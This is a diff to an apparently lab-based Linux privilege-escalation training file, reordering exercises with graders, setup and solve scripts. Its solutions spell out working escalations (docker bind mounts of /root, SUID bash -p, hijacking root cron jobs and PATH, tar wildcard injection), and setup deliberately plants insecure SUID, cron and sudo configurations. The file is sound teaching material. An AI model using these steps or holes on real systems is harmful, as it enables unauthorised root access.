@@ -4,6 +4,153 @@ profile: offsec
 order: 2
 exercises:
 
+# ===== Intermediate =====
+
+- id: offsec-priv-003
+  title: The docker group is root
+  difficulty: 3
+  kind: build
+  tags: [privesc, docker, group]
+  scenario: |
+    Run `id` — you're in the **`docker`** group. Anyone who can talk to the Docker
+    daemon can start a container that **mounts the host's filesystem** and reads
+    anything on it as root. Membership in `docker` is effectively root.
+
+    Mount the host's `/root` into a container and read **`/root/flag.txt`**. Write
+    it to **`/lab/flag.txt`**.
+  hints:
+    - "Bind-mount the host directory into a throwaway container: `docker run --rm -v /root:/r alpine cat /r/flag.txt` — but use a pre-pulled image."
+    - "`docker run --rm -v /root:/r:ro python:3.12-alpine cat /r/flag.txt`"
+  solution: |
+    ```bash
+    docker run --rm -v /root:/r:ro python:3.12-alpine cat /r/flag.txt > /lab/flag.txt
+    ```
+
+    The container runs as root and the bind mount exposes the host's files, so the
+    `docker` group is a direct path to root.
+  setup: |
+    root_flag >/dev/null
+    # The offsec VM already puts the lab user in the docker group; make sure.
+    usermod -aG docker "$(lab_user)" 2>/dev/null || true
+  check: |
+    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
+    check_flag
+  solve: |
+    docker run --rm -v /root:/r:ro python:3.12-alpine cat /r/flag.txt > /lab/flag.txt
+
+- id: offsec-priv-016
+  title: Enumerate your way in
+  difficulty: 3
+  kind: build
+  tags: [privesc, enumeration]
+  scenario: |
+    No hint about the vector this time — this is what real privilege escalation
+    feels like. **Enumerate** the system to find the one weakness, exploit it, and
+    read **`/root/flag.txt`** into **`/lab/flag.txt`**.
+
+    Good things to check: `sudo -l`, SUID binaries
+    (`find / -perm -4000 -type f 2>/dev/null`), file capabilities
+    (`getcap -r / 2>/dev/null`), writable files in `/etc`, and cron. Exactly one of
+    them is the way in.
+  hints:
+    - "Sweep for SUID binaries: `find / -perm -4000 -type f 2>/dev/null`. One of them is an unusual binary under `/opt`."
+    - "`/opt/backup/bash` is a SUID copy of bash — run `/opt/backup/bash -p` for a root shell, then read the flag."
+  solution: |
+    Enumeration finds a SUID `bash` at `/opt/backup/bash`. `bash -p` keeps the
+    elevated privileges:
+
+    ```bash
+    find / -perm -4000 -type f 2>/dev/null        # ... /opt/backup/bash
+    /opt/backup/bash -p -c 'cat /root/flag.txt' > /lab/flag.txt
+    ```
+  setup: |
+    root_flag >/dev/null
+    install -d -m 755 /opt/backup
+    install -m 4755 -o root -g root /usr/bin/bash /opt/backup/bash
+    on_reset 'rm -rf /opt/backup'
+  check: |
+    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
+    check_flag
+  solve: |
+    /opt/backup/bash -p -c 'cat /root/flag.txt' > /lab/flag.txt
+
+- id: offsec-priv-017
+  title: Harden the box
+  difficulty: 3
+  kind: fix
+  tags: [privesc, suid, sudo, remediation, hardening]
+  tutorial: |
+    **Concept.** This is the defender's side of privilege escalation: find the
+    thing that grants root and remove it. A needless SUID bit on a shell is a free
+    root shell for anyone, so strip it. An over-broad sudo rule — one that allows
+    an editor, pager or interpreter — is a root shell too, so rewrite it to allow
+    only a command that can't be turned into one. Always validate a sudoers file
+    with `visudo -c` before trusting it; a syntax error can lock out sudo entirely.
+
+    **Read up on:**
+    - `find -perm -4000` and `chmod u-s` — finding and removing the SUID bit
+    - the sudoers format and `visudo -cf FILE` — validating syntax offline
+    - GTFOBins — which commands must never appear in a sudo rule (`vi`, `less`, `awk`, ...)
+    - least privilege — granting only what a task genuinely needs
+  scenario: |
+    You're the administrator now. Close two privilege-escalation holes.
+
+    ## Part 1: Take away the SUID bit
+    A dangerous **SUID-root `bash`** sits at **`/opt/backup/bash`**. Remove the
+    SUID bit so no file under **`/opt/backup`** is SUID any more. (You have
+    password-less `sudo` for `chmod`.)
+
+    ## Part 2: Fix the sudo rule
+    **`/lab/kl-sudoers`** grants the `labs` group password-less root for
+    **`/usr/bin/vi`** — and `vi` can spawn a shell. Rewrite it so it still grants a
+    harmless capability (let the group run **`/usr/bin/id`** as root) but the
+    dangerous `vi` rule is gone. It must pass `visudo -c`.
+  hints:
+    - "Part 1: `find /opt/backup -perm -4000` then `sudo chmod u-s /opt/backup/bash`."
+    - "Part 2: replace the `vi` line with `%labs ALL=(root) NOPASSWD: /usr/bin/id`, then check `visudo -cf /lab/kl-sudoers`."
+  solution: |
+    ```bash
+    # Part 1 — strip the SUID bit
+    sudo chmod u-s /opt/backup/bash
+    find /opt/backup -perm -4000      # (no output = fixed)
+
+    # Part 2 — replace the editor grant with a harmless one
+    cat > /lab/kl-sudoers <<'EOF'
+    %labs ALL=(root) NOPASSWD: /usr/bin/id
+    EOF
+    visudo -cf /lab/kl-sudoers        # parsed OK
+    ```
+  setup: |
+    echo ok > "$KL_STATE/answer"
+    # --- part 1: Take away the SUID bit ---
+    install -d -m 755 /opt/backup
+    install -m 4755 -o root -g root /usr/bin/bash /opt/backup/bash
+    U=$(lab_user)
+    printf '%s ALL=(root) NOPASSWD: /usr/bin/chmod\n' "$U" > /etc/sudoers.d/kl-chmod
+    chmod 440 /etc/sudoers.d/kl-chmod
+    on_reset 'rm -rf /opt/backup; rm -f /etc/sudoers.d/kl-chmod'
+    # --- part 2: Fix the sudo rule ---
+    lab_file /lab/kl-sudoers <<'EOF'
+    %labs ALL=(root) NOPASSWD: /usr/bin/vi
+    EOF
+  check: |
+    info "Part 1: Take away the SUID bit"
+    n=$(find /opt/backup -perm -4000 -type f 2>/dev/null | wc -l)
+    check_eq "no SUID files remain under /opt/backup" "$n" "0"
+    info "Part 2: Fix the sudo rule"
+    check "sudoers file is syntactically valid" 'visudo -cf /lab/kl-sudoers'
+    check_not "the dangerous /usr/bin/vi rule is gone" 'grep -qE "/usr/bin/vi( |$|m)" /lab/kl-sudoers'
+    check "a safe NOPASSWD rule for /usr/bin/id remains" 'grep -qE "NOPASSWD:[[:space:]]*/usr/bin/id" /lab/kl-sudoers'
+  solve: |
+    # --- part 1 ---
+    sudo chmod u-s /opt/backup/bash
+    # --- part 2 ---
+    cat > /lab/kl-sudoers <<'EOF'
+    %labs ALL=(root) NOPASSWD: /usr/bin/id
+    EOF
+
+# ===== Advanced =====
+
 - id: offsec-priv-001
   title: Abusing a SUID-root binary
   difficulty: 4
@@ -149,38 +296,6 @@ exercises:
       --checkpoint=1 \
       --checkpoint-action=exec='sh -c "cat /root/flag.txt > /lab/tar.txt; chmod 644 /lab/tar.txt"'
 
-- id: offsec-priv-003
-  title: The docker group is root
-  difficulty: 3
-  kind: build
-  tags: [privesc, docker, group]
-  scenario: |
-    Run `id` — you're in the **`docker`** group. Anyone who can talk to the Docker
-    daemon can start a container that **mounts the host's filesystem** and reads
-    anything on it as root. Membership in `docker` is effectively root.
-
-    Mount the host's `/root` into a container and read **`/root/flag.txt`**. Write
-    it to **`/lab/flag.txt`**.
-  hints:
-    - "Bind-mount the host directory into a throwaway container: `docker run --rm -v /root:/r alpine cat /r/flag.txt` — but use a pre-pulled image."
-    - "`docker run --rm -v /root:/r:ro python:3.12-alpine cat /r/flag.txt`"
-  solution: |
-    ```bash
-    docker run --rm -v /root:/r:ro python:3.12-alpine cat /r/flag.txt > /lab/flag.txt
-    ```
-
-    The container runs as root and the bind mount exposes the host's files, so the
-    `docker` group is a direct path to root.
-  setup: |
-    root_flag >/dev/null
-    # The offsec VM already puts the lab user in the docker group; make sure.
-    usermod -aG docker "$(lab_user)" 2>/dev/null || true
-  check: |
-    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
-    check_flag
-  solve: |
-    docker run --rm -v /root:/r:ro python:3.12-alpine cat /r/flag.txt > /lab/flag.txt
-
 - id: offsec-priv-004
   title: Abusing a Linux capability
   difficulty: 4
@@ -252,139 +367,6 @@ exercises:
     # --- part 2 ---
     /srv/kl/tar cf /tmp/f.tar -P /root/flag.txt
     tar xf /tmp/f.tar -O -P /root/flag.txt > /lab/capdac.txt
-
-- id: offsec-priv-005
-  title: Writable paths that root trusts
-  difficulty: 5
-  kind: build
-  tags: [privesc, cron, writable, path, wildcard, tar]
-  tutorial: |
-    **Concept.** Root frequently runs scheduled jobs, and those jobs trust files
-    and directories that a normal user can sometimes write. If you can write the
-    script root runs, a directory early on root's `PATH`, or a directory whose
-    filenames become `tar`'s arguments (wildcard injection), then your code runs
-    as root on the next tick. All three are the same lesson: control an input to a
-    privileged job and you control the job.
-
-    **Read up on:**
-    - `/etc/cron.d/` — the format of system cron entries (note the user field)
-    - `ls -l` / `ls -ld` — spotting world-writable files and directories
-    - `$PATH` ordering in a cron job's environment
-    - tar wildcard injection — files named `--checkpoint=1` and `--checkpoint-action=exec=...`
-  scenario: |
-    Root runs three cron jobs every minute, each trusting something you can write.
-    Plant the right payload in each and wait (up to ~a minute) for it to run.
-
-    ## Part 1: The cron job you can rewrite
-    `/etc/cron.d/kl-harvest` runs **`/srv/kl/collect.sh`** as root, and that script
-    is world-writable. Make it copy the flag into **`/lab/cronscript.txt`**.
-
-    ## Part 2: The writable directory on root's PATH
-    A cron job runs **`backupdb`** by bare name with **`/srv/kl/bin`** (writable by
-    you) early on its `PATH`. Drop a `backupdb` there that reads the flag into
-    **`/lab/pathcron.txt`**.
-
-    ## Part 3: The wildcard in root's backup
-    A cron job runs `tar czf backup.tar.gz *` in **`/srv/kl/share`** (writable by
-    you). Plant filenames that turn into tar options so the flag lands in
-    **`/lab/wildcard.txt`**.
-  hints:
-    - "Part 1: overwrite `/srv/kl/collect.sh` with a script that does `cp /root/flag.txt /lab/cronscript.txt; chmod 644 /lab/cronscript.txt`, then wait for the next minute."
-    - "Part 2: `printf '#!/bin/bash\\ncat /root/flag.txt > /lab/pathcron.txt; chmod 644 /lab/pathcron.txt\\n' > /srv/kl/bin/backupdb; chmod +x /srv/kl/bin/backupdb`."
-    - "Part 3: in `/srv/kl/share`, create a payload `p.sh` and empty files named `--checkpoint=1` and `--checkpoint-action=exec=sh p.sh`."
-  solution: |
-    ```bash
-    # Part 1 — rewrite the world-writable cron script
-    cat > /srv/kl/collect.sh <<'EOF'
-    #!/bin/bash
-    cp /root/flag.txt /lab/cronscript.txt
-    chmod 644 /lab/cronscript.txt
-    EOF
-
-    # Part 2 — drop our own backupdb on root's PATH
-    cat > /srv/kl/bin/backupdb <<'EOF'
-    #!/bin/bash
-    cat /root/flag.txt > /lab/pathcron.txt
-    chmod 644 /lab/pathcron.txt
-    EOF
-    chmod +x /srv/kl/bin/backupdb
-
-    # Part 3 — tar wildcard injection
-    cd /srv/kl/share
-    echo 'cat /root/flag.txt > /lab/wildcard.txt; chmod 644 /lab/wildcard.txt' > p.sh
-    touch -- '--checkpoint=1'
-    touch -- '--checkpoint-action=exec=sh p.sh'
-
-    # wait for root's cron to run all three (up to ~60s)
-    for i in $(seq 1 45); do
-      [ -s /lab/cronscript.txt ] && [ -s /lab/pathcron.txt ] && [ -s /lab/wildcard.txt ] && break
-      sleep 2
-    done
-    ```
-  setup: |
-    root_flag >/dev/null
-    mkdir -p /srv/kl
-    # --- part 1: The cron job you can rewrite ---
-    cat > /srv/kl/collect.sh <<'EOF'
-    #!/bin/bash
-    # placeholder — root runs this every minute
-    :
-    EOF
-    chmod 0777 /srv/kl/collect.sh
-    printf '* * * * * root /srv/kl/collect.sh\n' > /etc/cron.d/kl-harvest
-    chmod 0644 /etc/cron.d/kl-harvest
-    on_reset 'rm -f /etc/cron.d/kl-harvest /srv/kl/collect.sh'
-    # --- part 2: The writable directory on root's PATH ---
-    install -d -m 777 /srv/kl/bin
-    printf 'PATH=/srv/kl/bin:/usr/bin:/bin\n* * * * * root backupdb\n' > /etc/cron.d/kl-backupdb
-    chmod 0644 /etc/cron.d/kl-backupdb
-    on_reset 'rm -f /etc/cron.d/kl-backupdb; rm -rf /srv/kl/bin'
-    # --- part 3: The wildcard in root's backup ---
-    install -d -m 1777 /srv/kl/share
-    cat > /srv/kl/backup.sh <<'EOF'
-    #!/bin/bash
-    cd /srv/kl/share || exit 0
-    tar czf /srv/kl/backup.tar.gz *
-    EOF
-    chmod 755 /srv/kl/backup.sh
-    printf '* * * * * root /srv/kl/backup.sh\n' > /etc/cron.d/kl-backup
-    chmod 0644 /etc/cron.d/kl-backup
-    on_reset 'rm -f /etc/cron.d/kl-backup; rm -rf /srv/kl/share /srv/kl/backup.sh /srv/kl/backup.tar.gz'
-  check: |
-    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
-    info "Part 1: The cron job you can rewrite"
-    check "the cron script is writable" 'sudo -u "$(lab_user)" test -w /srv/kl/collect.sh'
-    check_flag /lab/cronscript.txt
-    info "Part 2: The writable directory on root's PATH"
-    check "PATH dir is writable" 'sudo -u "$(lab_user)" test -w /srv/kl/bin'
-    check_flag /lab/pathcron.txt
-    info "Part 3: The wildcard in root's backup"
-    check "backup dir is writable" 'sudo -u "$(lab_user)" test -w /srv/kl/share'
-    check_flag /lab/wildcard.txt
-  solve: |
-    # --- part 1 ---
-    cat > /srv/kl/collect.sh <<'EOF'
-    #!/bin/bash
-    cp /root/flag.txt /lab/cronscript.txt
-    chmod 644 /lab/cronscript.txt
-    EOF
-    # --- part 2 ---
-    cat > /srv/kl/bin/backupdb <<'EOF'
-    #!/bin/bash
-    cat /root/flag.txt > /lab/pathcron.txt
-    chmod 644 /lab/pathcron.txt
-    EOF
-    chmod +x /srv/kl/bin/backupdb
-    # --- part 3 ---
-    cd /srv/kl/share
-    echo 'cat /root/flag.txt > /lab/wildcard.txt; chmod 644 /lab/wildcard.txt' > p.sh
-    touch -- '--checkpoint=1'
-    touch -- '--checkpoint-action=exec=sh p.sh'
-    # wait for all three cron jobs to run (up to ~90s)
-    for i in $(seq 1 45); do
-      [ -s /lab/cronscript.txt ] && [ -s /lab/pathcron.txt ] && [ -s /lab/wildcard.txt ] && break
-      sleep 2
-    done
 
 - id: offsec-priv-006
   title: Credentials left lying around
@@ -635,117 +617,6 @@ exercises:
     sudo systemctl start pwn
     for i in $(seq 1 10); do [ -s /lab/flag.txt ] && break; sleep 1; done
 
-- id: offsec-priv-016
-  title: Enumerate your way in
-  difficulty: 3
-  kind: build
-  tags: [privesc, enumeration]
-  scenario: |
-    No hint about the vector this time — this is what real privilege escalation
-    feels like. **Enumerate** the system to find the one weakness, exploit it, and
-    read **`/root/flag.txt`** into **`/lab/flag.txt`**.
-
-    Good things to check: `sudo -l`, SUID binaries
-    (`find / -perm -4000 -type f 2>/dev/null`), file capabilities
-    (`getcap -r / 2>/dev/null`), writable files in `/etc`, and cron. Exactly one of
-    them is the way in.
-  hints:
-    - "Sweep for SUID binaries: `find / -perm -4000 -type f 2>/dev/null`. One of them is an unusual binary under `/opt`."
-    - "`/opt/backup/bash` is a SUID copy of bash — run `/opt/backup/bash -p` for a root shell, then read the flag."
-  solution: |
-    Enumeration finds a SUID `bash` at `/opt/backup/bash`. `bash -p` keeps the
-    elevated privileges:
-
-    ```bash
-    find / -perm -4000 -type f 2>/dev/null        # ... /opt/backup/bash
-    /opt/backup/bash -p -c 'cat /root/flag.txt' > /lab/flag.txt
-    ```
-  setup: |
-    root_flag >/dev/null
-    install -d -m 755 /opt/backup
-    install -m 4755 -o root -g root /usr/bin/bash /opt/backup/bash
-    on_reset 'rm -rf /opt/backup'
-  check: |
-    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
-    check_flag
-  solve: |
-    /opt/backup/bash -p -c 'cat /root/flag.txt' > /lab/flag.txt
-
-- id: offsec-priv-017
-  title: Harden the box
-  difficulty: 3
-  kind: fix
-  tags: [privesc, suid, sudo, remediation, hardening]
-  tutorial: |
-    **Concept.** This is the defender's side of privilege escalation: find the
-    thing that grants root and remove it. A needless SUID bit on a shell is a free
-    root shell for anyone, so strip it. An over-broad sudo rule — one that allows
-    an editor, pager or interpreter — is a root shell too, so rewrite it to allow
-    only a command that can't be turned into one. Always validate a sudoers file
-    with `visudo -c` before trusting it; a syntax error can lock out sudo entirely.
-
-    **Read up on:**
-    - `find -perm -4000` and `chmod u-s` — finding and removing the SUID bit
-    - the sudoers format and `visudo -cf FILE` — validating syntax offline
-    - GTFOBins — which commands must never appear in a sudo rule (`vi`, `less`, `awk`, ...)
-    - least privilege — granting only what a task genuinely needs
-  scenario: |
-    You're the administrator now. Close two privilege-escalation holes.
-
-    ## Part 1: Take away the SUID bit
-    A dangerous **SUID-root `bash`** sits at **`/opt/backup/bash`**. Remove the
-    SUID bit so no file under **`/opt/backup`** is SUID any more. (You have
-    password-less `sudo` for `chmod`.)
-
-    ## Part 2: Fix the sudo rule
-    **`/lab/kl-sudoers`** grants the `labs` group password-less root for
-    **`/usr/bin/vi`** — and `vi` can spawn a shell. Rewrite it so it still grants a
-    harmless capability (let the group run **`/usr/bin/id`** as root) but the
-    dangerous `vi` rule is gone. It must pass `visudo -c`.
-  hints:
-    - "Part 1: `find /opt/backup -perm -4000` then `sudo chmod u-s /opt/backup/bash`."
-    - "Part 2: replace the `vi` line with `%labs ALL=(root) NOPASSWD: /usr/bin/id`, then check `visudo -cf /lab/kl-sudoers`."
-  solution: |
-    ```bash
-    # Part 1 — strip the SUID bit
-    sudo chmod u-s /opt/backup/bash
-    find /opt/backup -perm -4000      # (no output = fixed)
-
-    # Part 2 — replace the editor grant with a harmless one
-    cat > /lab/kl-sudoers <<'EOF'
-    %labs ALL=(root) NOPASSWD: /usr/bin/id
-    EOF
-    visudo -cf /lab/kl-sudoers        # parsed OK
-    ```
-  setup: |
-    echo ok > "$KL_STATE/answer"
-    # --- part 1: Take away the SUID bit ---
-    install -d -m 755 /opt/backup
-    install -m 4755 -o root -g root /usr/bin/bash /opt/backup/bash
-    U=$(lab_user)
-    printf '%s ALL=(root) NOPASSWD: /usr/bin/chmod\n' "$U" > /etc/sudoers.d/kl-chmod
-    chmod 440 /etc/sudoers.d/kl-chmod
-    on_reset 'rm -rf /opt/backup; rm -f /etc/sudoers.d/kl-chmod'
-    # --- part 2: Fix the sudo rule ---
-    lab_file /lab/kl-sudoers <<'EOF'
-    %labs ALL=(root) NOPASSWD: /usr/bin/vi
-    EOF
-  check: |
-    info "Part 1: Take away the SUID bit"
-    n=$(find /opt/backup -perm -4000 -type f 2>/dev/null | wc -l)
-    check_eq "no SUID files remain under /opt/backup" "$n" "0"
-    info "Part 2: Fix the sudo rule"
-    check "sudoers file is syntactically valid" 'visudo -cf /lab/kl-sudoers'
-    check_not "the dangerous /usr/bin/vi rule is gone" 'grep -qE "/usr/bin/vi( |$|m)" /lab/kl-sudoers'
-    check "a safe NOPASSWD rule for /usr/bin/id remains" 'grep -qE "NOPASSWD:[[:space:]]*/usr/bin/id" /lab/kl-sudoers'
-  solve: |
-    # --- part 1 ---
-    sudo chmod u-s /opt/backup/bash
-    # --- part 2 ---
-    cat > /lab/kl-sudoers <<'EOF'
-    %labs ALL=(root) NOPASSWD: /usr/bin/id
-    EOF
-
 - id: offsec-priv-019
   title: Environment variable to root
   difficulty: 4
@@ -795,6 +666,141 @@ exercises:
     printf '#!/bin/bash\ncat /root/flag.txt > /lab/flag.txt; chmod 644 /lab/flag.txt\n' > /tmp/evil
     chmod +x /tmp/evil
     sudo BACKUP_TAR=/tmp/evil /usr/bin/kl-backup
+
+- id: offsec-priv-005
+  title: Writable paths that root trusts
+  difficulty: 5
+  kind: build
+  tags: [privesc, cron, writable, path, wildcard, tar]
+  tutorial: |
+    **Concept.** Root frequently runs scheduled jobs, and those jobs trust files
+    and directories that a normal user can sometimes write. If you can write the
+    script root runs, a directory early on root's `PATH`, or a directory whose
+    filenames become `tar`'s arguments (wildcard injection), then your code runs
+    as root on the next tick. All three are the same lesson: control an input to a
+    privileged job and you control the job.
+
+    **Read up on:**
+    - `/etc/cron.d/` — the format of system cron entries (note the user field)
+    - `ls -l` / `ls -ld` — spotting world-writable files and directories
+    - `$PATH` ordering in a cron job's environment
+    - tar wildcard injection — files named `--checkpoint=1` and `--checkpoint-action=exec=...`
+  scenario: |
+    Root runs three cron jobs every minute, each trusting something you can write.
+    Plant the right payload in each and wait (up to ~a minute) for it to run.
+
+    ## Part 1: The cron job you can rewrite
+    `/etc/cron.d/kl-harvest` runs **`/srv/kl/collect.sh`** as root, and that script
+    is world-writable. Make it copy the flag into **`/lab/cronscript.txt`**.
+
+    ## Part 2: The writable directory on root's PATH
+    A cron job runs **`backupdb`** by bare name with **`/srv/kl/bin`** (writable by
+    you) early on its `PATH`. Drop a `backupdb` there that reads the flag into
+    **`/lab/pathcron.txt`**.
+
+    ## Part 3: The wildcard in root's backup
+    A cron job runs `tar czf backup.tar.gz *` in **`/srv/kl/share`** (writable by
+    you). Plant filenames that turn into tar options so the flag lands in
+    **`/lab/wildcard.txt`**.
+  hints:
+    - "Part 1: overwrite `/srv/kl/collect.sh` with a script that does `cp /root/flag.txt /lab/cronscript.txt; chmod 644 /lab/cronscript.txt`, then wait for the next minute."
+    - "Part 2: `printf '#!/bin/bash\\ncat /root/flag.txt > /lab/pathcron.txt; chmod 644 /lab/pathcron.txt\\n' > /srv/kl/bin/backupdb; chmod +x /srv/kl/bin/backupdb`."
+    - "Part 3: in `/srv/kl/share`, create a payload `p.sh` and empty files named `--checkpoint=1` and `--checkpoint-action=exec=sh p.sh`."
+  solution: |
+    ```bash
+    # Part 1 — rewrite the world-writable cron script
+    cat > /srv/kl/collect.sh <<'EOF'
+    #!/bin/bash
+    cp /root/flag.txt /lab/cronscript.txt
+    chmod 644 /lab/cronscript.txt
+    EOF
+
+    # Part 2 — drop our own backupdb on root's PATH
+    cat > /srv/kl/bin/backupdb <<'EOF'
+    #!/bin/bash
+    cat /root/flag.txt > /lab/pathcron.txt
+    chmod 644 /lab/pathcron.txt
+    EOF
+    chmod +x /srv/kl/bin/backupdb
+
+    # Part 3 — tar wildcard injection
+    cd /srv/kl/share
+    echo 'cat /root/flag.txt > /lab/wildcard.txt; chmod 644 /lab/wildcard.txt' > p.sh
+    touch -- '--checkpoint=1'
+    touch -- '--checkpoint-action=exec=sh p.sh'
+
+    # wait for root's cron to run all three (up to ~60s)
+    for i in $(seq 1 45); do
+      [ -s /lab/cronscript.txt ] && [ -s /lab/pathcron.txt ] && [ -s /lab/wildcard.txt ] && break
+      sleep 2
+    done
+    ```
+  setup: |
+    root_flag >/dev/null
+    mkdir -p /srv/kl
+    # --- part 1: The cron job you can rewrite ---
+    cat > /srv/kl/collect.sh <<'EOF'
+    #!/bin/bash
+    # placeholder — root runs this every minute
+    :
+    EOF
+    chmod 0777 /srv/kl/collect.sh
+    printf '* * * * * root /srv/kl/collect.sh\n' > /etc/cron.d/kl-harvest
+    chmod 0644 /etc/cron.d/kl-harvest
+    on_reset 'rm -f /etc/cron.d/kl-harvest /srv/kl/collect.sh'
+    # --- part 2: The writable directory on root's PATH ---
+    install -d -m 777 /srv/kl/bin
+    printf 'PATH=/srv/kl/bin:/usr/bin:/bin\n* * * * * root backupdb\n' > /etc/cron.d/kl-backupdb
+    chmod 0644 /etc/cron.d/kl-backupdb
+    on_reset 'rm -f /etc/cron.d/kl-backupdb; rm -rf /srv/kl/bin'
+    # --- part 3: The wildcard in root's backup ---
+    install -d -m 1777 /srv/kl/share
+    cat > /srv/kl/backup.sh <<'EOF'
+    #!/bin/bash
+    cd /srv/kl/share || exit 0
+    tar czf /srv/kl/backup.tar.gz *
+    EOF
+    chmod 755 /srv/kl/backup.sh
+    printf '* * * * * root /srv/kl/backup.sh\n' > /etc/cron.d/kl-backup
+    chmod 0644 /etc/cron.d/kl-backup
+    on_reset 'rm -f /etc/cron.d/kl-backup; rm -rf /srv/kl/share /srv/kl/backup.sh /srv/kl/backup.tar.gz'
+  check: |
+    check "cannot read the flag directly" '! sudo -u "$(lab_user)" cat /root/flag.txt'
+    info "Part 1: The cron job you can rewrite"
+    check "the cron script is writable" 'sudo -u "$(lab_user)" test -w /srv/kl/collect.sh'
+    check_flag /lab/cronscript.txt
+    info "Part 2: The writable directory on root's PATH"
+    check "PATH dir is writable" 'sudo -u "$(lab_user)" test -w /srv/kl/bin'
+    check_flag /lab/pathcron.txt
+    info "Part 3: The wildcard in root's backup"
+    check "backup dir is writable" 'sudo -u "$(lab_user)" test -w /srv/kl/share'
+    check_flag /lab/wildcard.txt
+  solve: |
+    # --- part 1 ---
+    cat > /srv/kl/collect.sh <<'EOF'
+    #!/bin/bash
+    cp /root/flag.txt /lab/cronscript.txt
+    chmod 644 /lab/cronscript.txt
+    EOF
+    # --- part 2 ---
+    cat > /srv/kl/bin/backupdb <<'EOF'
+    #!/bin/bash
+    cat /root/flag.txt > /lab/pathcron.txt
+    chmod 644 /lab/pathcron.txt
+    EOF
+    chmod +x /srv/kl/bin/backupdb
+    # --- part 3 ---
+    cd /srv/kl/share
+    echo 'cat /root/flag.txt > /lab/wildcard.txt; chmod 644 /lab/wildcard.txt' > p.sh
+    touch -- '--checkpoint=1'
+    touch -- '--checkpoint-action=exec=sh p.sh'
+    # wait for all three cron jobs to run (up to ~90s)
+    for i in $(seq 1 45); do
+      [ -s /lab/cronscript.txt ] && [ -s /lab/pathcron.txt ] && [ -s /lab/wildcard.txt ] && break
+      sleep 2
+    done
+
+# ===== Capstone: a real-world lab =====
 
 - id: offsec-priv-020
   title: Incident — from shell to root
